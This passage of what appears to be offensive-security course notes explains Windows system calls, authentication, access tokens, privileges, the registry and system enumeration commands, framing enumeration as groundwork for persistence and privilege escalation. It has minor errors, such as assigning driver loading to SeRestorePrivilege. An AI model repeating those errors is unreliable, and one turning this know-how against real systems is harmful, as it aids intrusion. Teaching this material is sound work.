<li>The system call number is placed into the <code>eax</code> register</li>
<li>The address of the return code is placed into the <code>ecx</code> register</li>
<li>The stack pointer is placed in the <code>edx</code> register</li>
<li>Function arguments will typically be pushed onto the user-mode stack from right to left (standard <code>__stdcall</code> or <code>__cdecl</code> convention used in Windows APIs, though this may vary).</li>
</ul>
</li>
</ul>
</li>
<li><code>SYSCALL</code> (64-bit Systems): The instruction used on modern 64-bit processors.
<ul>
<li>The system call number is placed in the <code>RAX</code> register</li>
<li><code>RCX</code> contains the first parameter to the kernel function</li>
<li><code>RDX</code> contains the second parameter</li>
<li><code>R8</code> and <code>R9</code> contain the 3rd and 4th respectively</li>
<li>Additional parameters are pushed onto the stack, from right to left.</li>
</ul>
</li>
</ul>
<div id="admonition-note-12" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-12-title">
<div class="admonition-title">
<div id="admonition-note-12-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-12"></a>
</div>
<div>
<p><code>SYSCALL</code> adheres to a more optimized calling convention, known as <code>__fastcall</code></p>
</div>
</div>
<ul>
<li><code>INT 0x2E</code> (Older 32-bit systems): Before <code>SYSENTER</code>, the standard method for a system call was a software interrupt instruction. We reviewed this previously.</li>
</ul>
<h3 id="transitioning-from-ring-0-to-ring-3"><a class="header" href="#transitioning-from-ring-0-to-ring-3">Transitioning from Ring 0 to Ring 3</a></h3>
<ul>
<li><code>SYSEXIT</code> (32-bit systems): The counterpart to <code>SYSENTER</code>. It takes a return address and a stack pointer from the specified registers (<code>ecx</code> and <code>edx</code>), and transitions the CPU back to Ring 3, returning control to the user-mode process.</li>
<li><code>SYSRET</code> (64-bit systems): The counterpart to <code>SYSCALL</code>. It loads the return address and stack pointer from saved registers, switches the CPU back to Ring 3, and resumes execution in user mode.</li>
</ul>
<h3 id="protection-rings-and-the-system-call-process"><a class="header" href="#protection-rings-and-the-system-call-process">Protection Rings and the System Call Process</a></h3>
<p>The protection rings are the fundamental enforcer of the System call process, ensuring that the transition is secure and controlled. Here is the process:</p>
<ol>
<li>
<p><strong>User-Mode Preparation and the <code>SYSCALL</code> Trap (Ring 3-&gt;0)</strong>:
A user application calls a high-level API (i.e., <code>CreateFile</code>), which is a wrapper for a low-level Native API function in <code>ntdll.dll</code> (<code>NtCreateFile</code>). This function prepares for the system call by loading the unique system call number into the appropriate register (<code>eax</code>/<code>rax</code>), loading the function parameters into the proper location based on the calling convention (<code>__cdecl</code>/<code>__fastcall</code>), and executing the system call instruction (<code>SYSCALL</code>, <code>SYSENTER</code>, etc.). The system call instruction traps the CPU into <code>Ring 0</code> and transfers control to a predefined entry point in the kernel.</p>
</li>
<li>
<p><strong>The Kernel's System Service Dispatcher (Ring 0)</strong>:
The first piece of kernel code to execute after a <code>SYSCALL</code> trap is a small, highly optimized routine called the <strong>System Service Dispatcher</strong>. On 64-bit and modern 32-bit systems, this is <code>KiSystemCall64</code>. On older 32-bit systems, this was <code>KiSystemService</code> and <code>KiFastSystemCall</code>. The core responsibilities of this dispatcher are to:
_ <strong>Save State</strong>: Create a trap frame on the kernel stack, which saves all of the user-mode register values, including the IP and SP, so the system can return to the exact point in the user application that made the call.
_ <strong>Validate the System Call</strong>: Check the system call number to ensure it is valid and within the expected range. * <strong>Determine the Target Function</strong>: <code>KiSystemCall64</code> uses the system call number to find the address of the actual kernel function to execute, using the <code>KiServiceTable</code>.</p>
</li>
<li>
<p><strong>The <code>KiServiceTable</code> and the System Service Descriptor Table (Ring 0)</strong></p>
</li>
</ol>
<p>The <code>KiServiceTable</code> is the primary System Service Dispatch Table. It is a large array of pointers to actual kernel functions that implement the Native APIs. These functions reside in <code>ntoskrnl.exe</code> and <code>win32k.sys</code>. The system call number passed in the <code>RAX</code>/<code>EAX</code> register is used as an index into this array. The dispatcher uses this number to lookup the correct function pointer in the <code>KiServiceTable</code>.</p>
<p>Previously, the location of the <code>KiServiceTable</code> was accessible through the <code>KeServiceDispatcherTable</code>. When a system call was made, <code>KiFastSystemCall</code> would query <code>KeServiceDispatcher</code> to identify the location of the <code>KiServiceTable</code>, allowing it to index the table and locate the appropriate kernel function in memory. Windows 10+ systems have updated this, and now the location of <code>KiServiceTable</code> is not exposed through any exported data structure. The location is randomized and hidden to prevent easy access from reverse-engineering tools and malware.</p>
<p>So, on modern 64-bit systems, <code>KiSystemCall64</code> uses a System Service Descriptor Table in a random, hidden location to query <code>KiServiceTable</code>, which contains pointers to the memory addresses of the kernel functions. 64-bit systems also implement a <code>KeServiceDescriptorTableShadow</code> file, which is documented, but hidden using <strong>Kernel Address Space Layout Randomization</strong>. It is used primarily for graphical and windowing-related system calls (i.e. from <code>win32k.sys</code>, <code>win32kbase.sys</code> and <code>win32kfull.sys</code>). <code>KeServiceDescriptorTableShadow</code> points to a separate dispatch table, <code>W32pserviceTable</code>, which contains functions implemented in the Win32k family.</p>
<p>In order to determine which dispatch table the system call number indexes, the system call number is analyzed and split into 3 section:</p>
<pre><code>31                             14 13  12 11              0
+--------------------------------+---+--+---------------+
|        Reserved/Ignored        |  TS  | Service Index |
+--------------------------------+---+--+---------------+

 &lt;------------------------------&gt; &lt;----&gt; &lt;--------------&gt;
           ~18 Bits               2 Bits     12 Bits
                               (Bits 12 &amp; 13)
</code></pre>
<ul>
<li><strong>Reserved/Ignored</strong>
<ul>
<li>Bits 14-31 ≈18 bits</li>
<li>Reserved or ignored.</li>
</ul>
</li>
<li><strong>Service Table Index</strong> (TS)
<ul>
<li>Bits 12-13 =2 bits</li>
<li>Selects one of the four possible System Service Dispatcher Tables.
<ul>
<li><code>00</code>: <code>KiServiceTable</code></li>
<li><code>01</code>: <code>W32pServiceTable</code></li>
<li><code>10</code>: <code>Configuration Service Table</code> (a special subset of <code>w32pServiceTable</code>)</li>
<li><code>11</code>: Reserved\Ignored</li>
</ul>
</li>
</ul>
</li>
<li><strong>Service Index</strong> (Func. ID)
<ul>
<li>Bits 0-11 =12 bits</li>
<li>The specific index (function ID) into the chosen service table.</li>
</ul>
</li>
</ul>
<div id="admonition-note-13" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-13-title">
<div class="admonition-title">
<div id="admonition-note-13-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-13"></a>
</div>
<div>
<p><strong>For Example</strong>:
<code>NtCreateFile</code> has a system call number of <code>0x55</code> on Windows 10.</p>
<pre><code>
// In binary, 0x55 is 010100000101b:

31 12 0
+------------------+--+------------+
|000000000000000000|00|010100000101|
+------------------+--+------------+

&lt;----------------&gt; &lt;&gt; &lt;----------&gt;
Reserved TS Call Num

</code></pre>
<p>As we can see, the <code>TS</code> bits are set to <code>0</code>, which informs <code>KiSystemCall64</code> that this system call number is indexed within <code>KiServiceTable</code>.</p>
</div>
</div>
<ol start="4">
<li><strong>Execution and Return (Ring 0-&gt;3)</strong>
Once the System Service Dispatcher (i.e., <code>KiSystemCall64</code>, <code>KiFastSystemCall</code>, etc.) finds the correct pointer, it jumps to the kernel function, executes the service, and returns control back to the System Service Dispatcher, which restores the saved user-mode state from the trap frame, and uses <code>SYSRET</code> or <code>SYSEXIT</code> to transition the CPU back to Ring 3.</li>
</ol>
<h2 id="user-authentication-identification-and-privileges"><a class="header" href="#user-authentication-identification-and-privileges">User Authentication, Identification, and Privileges</a></h2>
<h3 id="user-authentication"><a class="header" href="#user-authentication">User Authentication</a></h3>
<p>User Authentication describes the process of verifying a user is who they claim to be. On Windows, it is a multi-step process involving several key components and protocols:</p>
<ul>
<li><code>winlogon.exe</code>: A critical Windows process responsible for managing the secure attention sequence (<code>Ctrl</code>+<code>Alt</code>+<code>Del</code>) and initiating the user logon process.
<ul>
<li>Presents the user logon interface</li>
<li>Collects the user's credentials (username and password)</li>
<li>Passes the user credentials to the <strong>Local Security Authority Subsystem Service</strong> (LSASS).</li>
<li>Found at <code>C:\Windows\System32\winlogon.exe</code></li>
</ul>
</li>
<li><strong>Local Security Authority Subsystem Service</strong> (LSASS): A protected subsystem that enforces the security policy on Windows systems.
<ul>
<li>When it receives the user's credentials from <code>winlogon.exe</code>, it performs the actual authentication by comparing the provided information against a stored database.</li>
</ul>
</li>
<li><strong>Security Accounts Manager</strong> (SAM): For local accounts, the LSASS service validates the credentials against the <strong>SAM</strong> database, a registry hive (<code>(HKEY_LOCAL_MACHINE\SAM)</code> -&gt; <code>C:\Windows\System32\config\SAM</code>) that stores user account and group information, including password hashes.</li>
<li><strong>Active Directory</strong>: For domain-joined machines, the authentication request is sent to a Domain Controller, which holds the centralized Active Directory database.</li>
</ul>
<h3 id="user-identification"><a class="header" href="#user-identification">User Identification</a></h3>
<p>Once a user is authenticated, the system identifies them using a unique <strong>Security Identifier</strong> (SID). An <strong>SID</strong> is a variable-length, cryptographically unique value that identifies a user, group, or computer account on a Windows system. It is created when the account is first created and exists as a core part of the system's security architecture, used by the operating system for access control decisions.</p>
<p><img src="https://hackmd.io/_uploads/rkvXfVF0el.png" alt="image" /></p>
<blockquote>
<p>Example of an <strong>SID</strong></p>
</blockquote>
<ul>
<li><strong>SID String</strong>: <code>S</code> indicates that the value is an SID.</li>
<li><strong>Revision Level</strong>: Indicates the version of the SID structure. It has been <code>1</code> since <code>Windows NT 3.1</code> in 1993.</li>
<li><strong>Authority ID</strong>: Speficies who created or granted the SID, as follows:
<ul>
<li><code>NULL</code>: 0</li>
<li><code>World Authority</code>: 1</li>
<li><code>Local Authority</code>: 2</li>
<li><code>Creator Authority</code>: 3</li>
<li><code>Non-unique Authority</code>: 4</li>
<li><code>NT Authority</code>: 5</li>
</ul>
</li>
<li><strong>Subauthority Identifier</strong>: A series of values that uniquely identify the account within the authority.</li>
<li><strong>Relative Identifier</strong> (RID): The final part of the SID that makes it unique. Windows will assign the following unique RIDs to specific users:
<ul>
<li><code>Administrator</code>: 500</li>
<li><code>Guest User</code>: 501</li>
<li><code>Domain Administrator</code>: 512</li>
<li><code>Domain Computer</code>: 515</li>
</ul>
</li>
</ul>
<p>You can enumerate the SIDs on a Windows system using:</p>
<pre><code class="language-asm64">$ wmic useraccount get name,sid
</code></pre>
<p>Pay attention to the RIDs, as they can be used to quickly identify administrators and guest accounts.</p>
<h3 id="access-tokens"><a class="header" href="#access-tokens">Access Tokens</a></h3>
<p>After successful authentication, LSASS generates an <strong>Access Token</strong>, which is a kernel object created by the <strong>Security Reference Monitor</strong> (SRM) that represents the security context of a principal. It contains all of the necessary information for the operating system to determine a user's rights and permissions. When a user runs a process, the process is assigned a copy of their access token, the user's SID, the SIDs of all the groups the user is a member of, a list of the user's privileges (i.e., <code>SeShutdownPriilege</code>), their Integrity Level and the <strong>Discretionary Access Control List</strong> (DACL) being used. A lot of the information within the access token can be viewed using the following command:</p>
<pre><code class="language-asm64">$ whoami /all
</code></pre>
<p>All child processes inherit a copy of the access token from their parent process, which is how the security context is maintained throughout a user's session.</p>
<h3 id="authentication-protocols"><a class="header" href="#authentication-protocols">Authentication Protocols</a></h3>
<h4 id="new-technology-lan-manager-ntlm"><a class="header" href="#new-technology-lan-manager-ntlm">New Technology LAN Manager (NTLM)</a></h4>
<ul>
<li><strong>How it Works</strong>:
<ol>
<li>Client sends authentication request to server</li>
<li>Server sends client a challenge (random number)</li>
<li>Client encrypts the challenge using a hash of its password (NT Hash)</li>
<li>Client sends encrypted challenge to server</li>
<li>Server decrypts the response payload using the clients hash and compares the retrieved value with the challenge to verify authenticity.</li>
</ol>
</li>
<li><strong>NTLMv2</strong>: An updated version of NTLM that upgrades security in a number of ways, including stronger cryptographic hashing and a timestamp in the challenge response mechanism to mitigate replay attacks. Still less secure than Kerberos.</li>
</ul>
<h4 id="kerberos"><a class="header" href="#kerberos">Kerberos</a></h4>
<ul>
<li><strong>Kerberos</strong>: The default and preferred authentication protocol for Active Directory environments.</li>
<li><strong>How it Works</strong>:
<ol>
<li>A user authenticates with the <strong>Key Distribution Center</strong> (KDC)</li>
<li>The KDC issues a <strong>ticket-granting ticket</strong> (TGT) to the client to the client.</li>
<li>The user uses the TGT to request <strong>Service Tickets</strong> to access different resources without re-entering their password.</li>
</ol>
</li>
<li>Kerberos uses mutual authentication and tickets are timestamped. More information on Kerberos can be found in <code>Appendix C: A Primer on Kerberos</code>.</li>
</ul>
<h3 id="privileges-granular-control-over-system-operations"><a class="header" href="#privileges-granular-control-over-system-operations">Privileges: Granular Control over System Operations</a></h3>
<p>A <strong>Privilege</strong> represents a specific right that allows a security principal to perform a system-wide operation that goes beyond standard file or object access permissions.</p>
<div id="admonition-note-14" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-14-title">
<div class="admonition-title">
<div id="admonition-note-14-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-14"></a>
</div>
<div>
<p>A <strong>Security Principal</strong> is an identity that can be authenticated and. authorized to access resources. This is someone or something the OS can assign permissions to, including:</p>
<ul>
<li>User Accounts</li>
<li>Groups</li>
<li>Computer Accounts</li>
<li>Service Accounts</li>
<li>Managed Service Accounts
Each security principal has a unique SID and they are represented by access tokens</li>
</ul>
</div>
</div>
<p>Privileges are powerful rights that are distinct from ACL permissions on individual objects. ACLs may dictate who can read/write to a specific file, but a privilege dictates who can perform a broader system action (i.e., loading a driver, shutting down the computer, etc.)</p>
<p>Some common privileges are:</p>
<ul>
<li><code>SeTimeZonePrivilege</code>: Grants a user the right to change the system's time zone</li>
<li><code>SeShutdownPrivilege</code>: Allows a user to shut down or restart the local computer</li>
<li><code>SeDebugPrivilege</code> (Highly Sensitive): Grants the right to debug processes owned by other users or the operating system itself. Often leveraged for privilege escalation.</li>
<li><code>SeTakeOwnershipPrivilege</code> (Highly Sensitive): Allows a user to take ownership of any securable object, regardless of existing ACLs. Can be used to bypass security on files, registry keys, etc.</li>
<li><code>SeRestorePrivilege</code> (Extremely Sensitive): Grants the right to load and unload device drivers. Extremely powerful, as loading a malicious kernel driver grants complete control over the system (Ring 0 access).</li>
<li><code>SeCreateTokenPrivilege</code> (Extremely Sensitive): Allows a process to create a primary token or an impersonation token, effevtively enabling the creation of arbitraty access tokens to impersonate any user with any privilege and any domain group membership. <strong>God-mode</strong> privilege for identity manipulation.</li>
</ul>
<h4 id="enabling-privileges-within-a-processs-access-token"><a class="header" href="#enabling-privileges-within-a-processs-access-token">Enabling Privileges Within a Process's Access Token</a></h4>
<p>Even if a user has been granted a privilege, a process running under that user's context does not automatically use that privilege. By default, most privileges in a process's access token are in the <strong>disabled</strong> state. To use a privilege, a process must explicitly enable it within its own access code, using the <code>AdjustTokenPrivileges()</code> API function:</p>
<ol>
<li><strong>Open Process Token</strong>: The process first needs to open its own access token, using <code>OpenProcessToken</code>.</li>
<li><strong>Lookup Privilege LUID</strong>: The processor needs to find the <strong>Local Unique Identifier</strong> (LUID) for the desired privilege (i.e., <code>SeDebugPrivilege</code>) using <code>LookupPrivilegeValue</code>
<ul>
<li>The <strong>LUID</strong> is a locally unique 64-bit identifier used to refer to a privilege</li>
</ul>
</li>
<li><strong>Adjust Token Privileges</strong>: Finally, the process calls <code>AdjustTokenPrivileges</code>, by passing the LUID and specifying that the privilege should be enabled (<code>SE_PRIVILEGE_ENABLED</code>).</li>
<li><strong>Failure if Not Granted</strong>: If the privilege has bot been granted to the security principal in the first place, <code>AdjustTokenPrivileges</code> will fail, indicating that the process does not have the right to enable it.</li>
</ol>
<h4 id="verifying-privileges"><a class="header" href="#verifying-privileges">Verifying Privileges</a></h4>
<p>When a process attempts to perform a system-related operation that requires a privilege, the operating system (or the specific kernel component handling the request) will verify that the necessary privilege is enabled in the caller's access token. The kernel function that performs the desired operation (i.e., <code>ZwCreateDebugObject</code> for debugging) will check the caller's access token for the appropriate privilege (i.e., <code>SeDebugPrivilege</code>) has the <code>SE_PRIVILEGE_ENABLED</code> flag set.</p>
<h4 id="privilege-data-structures"><a class="header" href="#privilege-data-structures">Privilege Data Structures</a></h4>
<ol>
<li><strong>LUID</strong>
This structure defines a 64-bit value that is guaranteed to be unique on the local system until it is rebooted. It is used to represent privileges internally.</li>
</ol>
<pre><code class="language-C">typedef struct _LUID {
    DWORD LowPart;
    LONG HighPart;
} LUID, *PLUID;
</code></pre>
<ol start="2">
<li><strong>LUID_AND_ATTRIBUTES</strong>
This structure specifies a LUID and its attributes (i.e., whether the privilege is enabled or disabled)</li>
</ol>
<pre><code class="language-C">typedef struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
} LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES
</code></pre>
<p>Some common <code>Attributes</code> flags are:</p>
<ul>
<li><code>SE_PRIVILEGE_ENABLED</code>: The privilege is enabled</li>
<li><code>SE_PRIVILEGE_REMOVED</code>: The privilege was removed</li>
<li><code>SE_PRIVILEGE_USED_FOR_ACCESS</code>: The privilege was used to gain access</li>
<li><code>SE_PRIVILEGE_ENABLED_BY_DEFAULT</code>: The privilege is enabled by default</li>
</ul>
<ol start="3">
<li><strong>Token_Privileges</strong>
This structure contains an array of <code>LUID_AND_ATTRIBUTES</code> structures, representing a set of privileges with an access token. This is the structure used with <code>AdjustTokenPrivileges</code></li>
</ol>
<pre><code class="language-C">typedef struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
}TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES
</code></pre>
<h4 id="discovering-and-manipulating-user-privileges"><a class="header" href="#discovering-and-manipulating-user-privileges">Discovering and Manipulating User Privileges</a></h4>
<ol>
<li><strong>Viewing Privileges in Your Current Process Token</strong></li>
</ol>
<pre><code class="language-asm64">$ whoami /priv
</code></pre>
<p>This is the easiest way to see what privileges your current user account has been granted and which are currently enabled in your current process's access token. <strong>Enabled</strong> means that the privilege is active and can be used by your process. <strong>Dissabled</strong> means that the privilege has been granted to your account but is not currently active in your process's token. You would need <code>AdjustTokenPrivileges</code> in your code to enable it. If the privilege has not been listed it has not been granted.</p>
<ol start="2">
<li><strong>Listing User Rights Assignments (Privileges) for Accounts</strong>
You can export the entire local security policy, including user rights assignments, using secedit:</li>
</ol>
<pre><code class="language-asm64">$ secedit /export /cfg [save_loc] /areas USER_RIGHTS
</code></pre>
<p>where, <code>save_loc</code> is the location of the saved file + name (i.e, <code>C:\Windows\in\secpol.inf</code>)</p>
<ol start="3">
<li><strong>Manipulating User Rights Assignments</strong>
<code>ntrights.exe</code> is a valuable tool, which can be used to grant a privilege to a user or revoke a privilege from a user, however it is not included .</li>
</ol>
<h2 id="the-windows-registry"><a class="header" href="#the-windows-registry">The Windows Registry</a></h2>
<p>The <strong>Windows Registry</strong> is a centralized, hierarchical database used by the operating system and applications to store configuration settings, user preferences, and a wealth of other information. It plays a vital role in facilitating many aspects of system operation, fro startup to user interaction:</p>
<h3 id="process-initialization-and-executable-loading"><a class="header" href="#process-initialization-and-executable-loading">Process Initialization and Executable Loading</a></h3>
<p>The registry contains keys that dictate which programs and services should run when the system boots or when a user logs on. For instance:</p>
<ul>
<li>
<p><code>Run</code>: Programs registered here will start on every logon. They are persistent until removed manually. They can be found at:
<img src="https://hackmd.io/_uploads/rJjVOw50eg.png" alt="image" />
_ <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>
_ <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
</li>
<li>
<p><code>RunOnce</code>: Programs registered here will start only once at the next logon, and Windows deletes the registry value after execution.
<img src="https://hackmd.io/_uploads/H16Eav9Axe.png" alt="image" />
_ <code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
_ <code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></p>
</li>
<li>
<p><code>Userinit</code>: Programs registeredhere tell <code>winlogon.exe</code> to run them after a successful logon. The default is <code>userinit.exe</code>. This happens before <code>Run</code>/<code>RunOnce</code>, which run after <code>explorer.exe</code> is launched.
<img src="https://hackmd.io/_uploads/Bkh3Cvq0gg.png" alt="image" />
_ <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code>
_ <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
</li>
<li>
<p><strong>DLL Loading</strong>: DLLs are generally searched for by the Windows Loader using a search order (more on this in <code>Malware Essentials: DLL Highjacking</code>). However, in some instances the Windows registry plays a role in how/why DLLs are loaded. For example: * <code>KnownDLLs</code>: A list of DLLs that are always loaded form <code>System32</code> for security and performance (to prevent DLL preloading attacks. Located at <code>HKLM\SYSTEM\CurerntControlSet\Control\Session Manager\KnownDLLs</code>
<img src="https://hackmd.io/_uploads/rJsNWO5Axl.png" alt="image" /></p>
<pre><code>* `Appinit_DLLs` (historically): Tells `user32.dll` to load extra DLLs into every GUI process. This is mostly disabled by default now, as it allows malicious DLLs to be loaded into many processes automatically.
</code></pre>
</li>
</ul>
<h3 id="user-authentication-and-identification"><a class="header" href="#user-authentication-and-identification">User Authentication and Identification</a></h3>
<p>The Registry also contains data that plays a vital role in facilitating user authentication and identification processes. For example:</p>
<ul>
<li>
<p><strong>SAM Database</strong>: The <strong>Security Accounts Manager</strong> (SAM) database is loaded at <code>HKLM\SAM</code>.
<img src="https://hackmd.io/_uploads/HJBQfdqRgl.png" alt="image" /></p>
</li>
<li>
<p><strong>User Profiles and SIDs</strong>: The <code>HKEY_USERS</code> hive contains a subkey for each actively loaded user profile, identified by the user's SID. This is how the system stores user-specific settings, such as desktop appearance, application configuration, and network connections. When a user logs in, their profile hive is loaded into memory and linked to the <code>HKEY_CURRENT_USER</code> hive.
<img src="https://hackmd.io/_uploads/HkZFQO9Clx.png" alt="image" /></p>
</li>
</ul>
<h3 id="memory-management-1"><a class="header" href="#memory-management-1">Memory Management</a></h3>
<p>The Windows Registry is used to facilitate certain functions of Memory Management on the system as well. For instance:</p>
<ul>
<li>
<p><strong>Paging File Configuration</strong>: The registry key <code>HKLM\SYSTEM\CurrentControlSet\Constrol\Session Manager\Memory Management</code> contains settings related to the virtual memory system, including the size and location of the paging file.
<img src="https://hackmd.io/_uploads/Byj8EdqAgl.png" alt="image" /></p>
</li>
<li>
<p><strong>System and Driver Information</strong>: The registry stores configuration information for device drivers under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. This information is accessed by the operating system's <strong>Plug and Play</strong> (PnP) manager during system startup and driver loading. It is an important connection to the memory management APIs, as it dictates how drivers are loaded into memory.
<img src="https://hackmd.io/_uploads/BJILSdqCex.png" alt="image" /></p>
</li>
</ul>
<h3 id="interacting-with-registry-values"><a class="header" href="#interacting-with-registry-values">Interacting with Registry Values</a></h3>
<p>You can <strong>set</strong> a registry value using the following command:</p>
<pre><code class="language-asm64">$ reg add "HKCU\Software\Test" /v Setting /t REG_SZ /d "Hello, World!"
</code></pre>
<p>Where:</p>
<ul>
<li><code>HKCU</code>: Shorthand for "HKEY_CURRENT_USER"</li>
<li><code>/v Setting</code>: Specifies the value name ("Setting")</li>
<li><code>/t REG_SZ</code>: Specifies the data type as a string</li>
<li><code>/d "Hello, World!"</code>: Specifies the data to be written</li>
</ul>
<p>You can <strong>get</strong> a registry value using the following command:</p>
<pre><code class="language-asm64">$ reg query "HKCU\Software\Test" /v "Setting"
</code></pre>
<p><strong>Output</strong>:</p>
<pre><code>HKEY_CURRENT_USER\Software\Test
    Setting    REG_SZ    Hello, World!
</code></pre>
<p>You can <strong>delete</strong> a registry value using the following command:</p>
<pre><code class="language-asm64">reg delete "HKCU\Software\Test" \v Setting /f
</code></pre>
<p><strong>Where</strong>:</p>
<ul>
<li><code>/f</code>: The force flag, which prevents an "Are you sure" prompt</li>
</ul>
<h2 id="enumerating-windows-systems"><a class="header" href="#enumerating-windows-systems">Enumerating Windows Systems</a></h2>
<p><strong>Enumeration</strong> is the process of gathering information about a system including the operating system and hardware, the users and groups, the security configuration, and the network configuration.</p>
<h3 id="os-and-hardware-enumeration"><a class="header" href="#os-and-hardware-enumeration">OS and Hardware Enumeration</a></h3>
<p>System enumeration on Windows is relatively simple. A few commands can expose a lot of information about the system, given the right permissions.</p>
<p><code>systeminfo</code> is a very useful, built-in command that uncovers a lot of details, including:</p>
<ul>
<li>The <strong>Operating System</strong>, its <strong>Version</strong>, and its <strong>Build</strong></li>
<li>The <strong>System Manufacturer</strong> and the <strong>CPUs</strong> installed</li>
<li>The <strong>Total Physical Memory</strong> and the <strong>Physical Memory Available</strong></li>
<li>The <strong>Virtual Memory In Use</strong> and the <strong>Virutal Memory Available</strong></li>
<li>The location of the <strong>Page File</strong></li>
<li>The <strong>Network Cards</strong> installed, their assigned <strong>IP Addresses</strong>, and their default <strong>DHCP Servers</strong></li>
</ul>
<p><img src="https://hackmd.io/_uploads/r1rsP0xyWx.png" alt="image" /></p>
<p>Clearly, <code>systeminfo</code> can be a very powerful tool. It becomes even more useful when used in combination with <code>findstr</code>:
<img src="https://hackmd.io/_uploads/SJN43Rx1Wx.png" alt="image" /></p>
<p>Where:</p>
<ul>
<li><code>findstr</code>: A Windows command-line utility, which can be used to identify strings within files and file streams, similar to <code>grep</code> on UNIX systems.</li>
<li><code>/I</code>: Case insensitive search</li>
<li><code>/C:[text]</code>: Exact string literal search</li>
<li><code>/B</code>: Search for string at the beginning of a line</li>
<li><code>/R</code>: Search string is a regular expression</li>
</ul>
<p><code>systeminfo</code> and <code>findstr</code> can be a great tool for identifying hotfixes that have been installed on the system. A <strong>Hotfix</strong> is a small, targeted system update that aims to solve a particular issue without requiring a full service pack or a major software release. Identifying hotfixes can inform decisions about establishing persistence, using techniques to escalate privileges, and evading malware detection systems:
<img src="https://hackmd.io/_uploads/HJ5gxy-1Wl.png" alt="image" /></p>
<p><strong>Hotfixes</strong> can also be identified using the <strong>Windows Management Instrumentation Command-line</strong> (WMIC) utility. WMIC is a build-in Windows command that allows users to query and manage various settings and system information from the command line:
<img src="https://hackmd.io/_uploads/Sya9HyW1be.png" alt="image" />
Where:</p>
<ul>
<li><code>WMIC</code>: Windows Management Instrumentation Command-line**</li>
<li><code>qfe</code>: Quick Fix Engineering (hotfixes)</li>
<li><code>get</code>: Retrieves a set of given properties from the records of the queried data set.</li>
</ul>
<div id="admonition-warning" class="admonition admonish-warning" role="note" aria-labelledby="admonition-warning-title">
<div class="admonition-title">
<div id="admonition-warning-title">
<p>Warning</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-warning"></a>
</div>
<div>
<p><code>wmic</code> <strong>has been deprecated on Windows 10+</strong> and is not included on clean installations of <strong>Windows 11 24H2+</strong>. This was primarily because it was old, and presented a security liability as it's operations were poorly documented. However, WMI still plays an important role in managing and querying the configuration and state of Windows Systems. It can now be interacted with using <strong>Common Information Model</strong> interfaces, which provide a standard, object-oriented way of querying WMI directly within PowerShell (rather than using the <code>wmic.exe</code> program).</p>
<p><img src="https://hackmd.io/_uploads/HkTg6nD-Wx.png" alt="image" /></p>
</div>
</div>
<p><code>wmic</code> is capable of identifying much of the same info as <code>systeminfo</code>, including information about the CPU, the hardware specifications, the BIOS, and the Operating System:
<img src="https://hackmd.io/_uploads/H1QES1-J-e.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalent is:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_OperatingSystem \
| Select-Object BuildNumber, Name, InstallDate
</code></pre>
<p><code>wmic</code> can also be used to retrieve the environment variables that are stored on the system, similar to <code>printenv</code> on UNIX systems:
<img src="https://hackmd.io/_uploads/rkBuNkZ1Wg.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalent is:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_Environment \
| Select-Object Name, VariableValue
</code></pre>
<p>Importantly, <code>wmic</code> can be used to list the running processes and related information:
<img src="https://hackmd.io/_uploads/rkLTElbk-x.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalent is:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_Process \
| Select-Object ProcessID, ExecutablePath, WorkingSetSize
</code></pre>
<p>Although it is less verbose, the <code>tasklist</code> command can be used to achieve the same objective:
<img src="https://hackmd.io/_uploads/H1qA9JZy-g.png" alt="image" />
Where:</p>
<ul>
<li><code>tasklist</code>: A built-in Windows command that displays a list of processes currently active on the system.</li>
</ul>
<p>You can also list the services being run under a particular process, using the <code>/SVC</code> option:
<img src="https://hackmd.io/_uploads/SJUtUJbyZx.png" alt="image" /></p>
<p>As we can see, there are a number of tools we can use to find information about the system, built into the operating system.</p>
<h3 id="user-and-group-enumeration"><a class="header" href="#user-and-group-enumeration">User and Group Enumeration</a></h3>
<p>Previously, we discussed the <code>whoami</code> tool and its role in revealing information about principals, access tokens, and privileges on the system. This is a form enumeration. <code>whoami</code> has many capabilities, including the ability to list what groups the current account is a part of:
<img src="https://hackmd.io/_uploads/Hy-GnJ-ybg.png" alt="image" /></p>
<p><code>wmic</code> can also be used for user and group enumeration. We previously saw how <code>wmic</code> can be used to identify the <code>SID</code> of every principal on the system:
<img src="https://hackmd.io/_uploads/BkF7lxW1We.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalent is:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_UserAccount \
| Select-Object Name, SID
</code></pre>
<p>Similarly, <code>wmic</code> can be used to list every group that can be found on the system:
<img src="https://hackmd.io/_uploads/B1FSkebkbg.png" alt="image" /></p>
<blockquote>
<p>The <strong>CIM</strong> equivalent is:</p>
</blockquote>
<pre><code class="language-PowerShell">PS&gt; Get-CimInstance -ClassName Win32_OperatingSystem \
| Select-Object BuildNumber, Name, InstallDate
</code></pre>
